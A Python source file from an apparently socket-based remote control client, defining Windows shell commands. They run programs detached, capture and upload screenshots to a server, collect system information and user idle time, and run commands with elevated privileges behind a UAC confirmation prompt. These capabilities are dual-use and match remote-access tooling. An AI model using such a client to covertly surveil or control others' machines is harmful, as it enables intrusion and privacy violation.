from client.commands.runtime.interrupts import timeout
from client.commands.platform.services.win.media_service import WinMediaService
from client.commands.platform.services.win.privilege_service import WinPrivilegeService
from client.commands.platform.services.win.process_service import WinProcessService
from client.commands.platform.services.win.system_service import WinSystemService
from client.commands.shell.decorators import shell_command
from core.utils.decorator import confirm


class WindowsShellCommands:
    """Windows Shell commands."""

    def __init__(self, socket):
        super().__init__(socket)
        self.win_process = WinProcessService(self)
        self.win_system = WinSystemService(self)
        self.win_media = WinMediaService(self)
        self.win_privilege = WinPrivilegeService(self)

    # On Windows os.execv() creates a new PID; this override stays unregistered.
    def reexec_instance(self):
        return 0, 'Process replacement is unavailable on Windows'

    @shell_command('Run a program without waiting (detached)', group='execution')
    def run(self, command):
        """
        启动程序但不等待返回（独立运行）
        """
        return self.win_process.run(command)

    @shell_command('Capture screenshot', group='media', output='stream')

    @timeout(30)
    def screenshot(self):
        """
        截图并上传到服务器
        """
        return self.win_media.capture_screenshot()

    @shell_command('Get system information', group='system')

    @timeout(30)
    def getinfo(self):
        """
        获取 Windows 系统信息
        """
        return self.win_system.collect_system_info()

    @shell_command('Get user idle time', group='system')

    @timeout(10)
    def idletime(self):
        """
        获取用户空闲时间（秒）
        """
        return self.win_system.get_user_idletime()

    @shell_command('Run a command with elevated privileges', group='privilege')
    @confirm('This may show a Windows UAC permission prompt and wait for authorization. Continue?')
    def run_elevated(self, command):
        """
        以管理员权限执行命令
        """
        return self.win_privilege.run_as_admin(command)

    @shell_command('Launch a new instance with elevated privileges', group='privilege')
    @confirm('This may show a Windows UAC permission prompt and wait for authorization. Continue?')
    def spawn_elevated_instance(self, options=''):
        option = options.strip()
        if option not in ('', '--detached'):
            return 0, 'Usage: spawn_elevated_instance [--detached] [--no-confirm]'
        return self.win_privilege.spawn_elevated_instance(detached=(option == '--detached'))
